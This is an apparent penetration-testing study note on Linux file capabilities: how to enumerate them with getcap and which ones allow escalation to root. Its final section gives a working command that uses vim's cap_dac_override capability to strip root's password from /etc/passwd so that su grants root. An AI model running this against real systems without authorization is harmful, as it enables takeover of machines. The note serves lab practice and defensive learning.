---
title: Process capabilities - getcap
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - privilege escalation
  - linux
---

# Process capabilities: getcap

Linux capabilities **provide a subset of the available root privileges** to a process. For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: _privileged_ processes (whose effective user ID is 0, referred to as superuser or root), and _unprivileged_ processes (whose effective UID is nonzero). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process's credentials (usually: effective UID, effective GID, and supplementary group list).

In Linux, files may be given specific capabilities. For example, if an executable needs to access (read) files that are only readable by root, it is possible to give that file this `permission` without having it run with complete root privileges. This allows for a more secure system in general.

getcap and setcap are used to view and set capabilities, respectively. They usually belong to the libcap2-bin package on debian and debian-based distributions.

### Enumerate
Scan all files in system and check capabilities:

```shell-session
getcap -r / 2>/dev/null
```

Check what every capability means in [https://linux.die.net/man/7/capabilities](https://linux.die.net/man/7/capabilities)

Knowing what capability is assigned to a proccess, try to make the best of it to escalate privileges. 

Also:

```shell-session
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Example in [HackTheBox: nunchucks](htb-nunchucks.md) in which perl command has " cap_setuid+ep" capabilities, which means that at some point may run as sudo.


| **Capability**         | **Description**                                                                                                                                           |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_sys_admin`        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |
| `cap_sys_chroot`       | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
| `cap_sys_ptrace`       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| `cap_sys_nice`         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
| `cap_sys_time`         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
| `cap_sys_resource`     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
| `cap_sys_module`       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
| `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |

When a binary is executed with capabilities, it can perform the actions that the capabilities allow. Here are some examples of values that we can use with the `setcap` command, along with a brief description of what they do:

| **Capability Values** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                   | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.                                                                                                                                                                                                                                        |
| `+ep`                 | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.                                                                                                                                                    |
| `+ei`                 | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.                                                                                                                                    |
| `+p`                  | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |


### Several Linux capabilities can be used to escalate a user's privileges to `root`

| **Capability**     | **Desciption**                                                                                                                                                                                                               |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |

### cap_dac_override

Get the capabilities of a binary:

```shell-session
getcap /usr/bin/vim.basic
```

Output:

```
/usr/bin/vim.basic cap_dac_override=eip
```

We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```shell-session
/usr/bin/vim.basic /etc/passwd
```

We also can make these changes in a non-interactive mode:

```shell-session
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

Now, we can see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password:

```shell-session
 cat /etc/passwd | head -n1
```

Output:

```
root::0:0:root:/root:/bin/bash
```

## Labs

[HackTheBox: nunchucks](htb-nunchucks.md)



## Resources

[Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

[https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
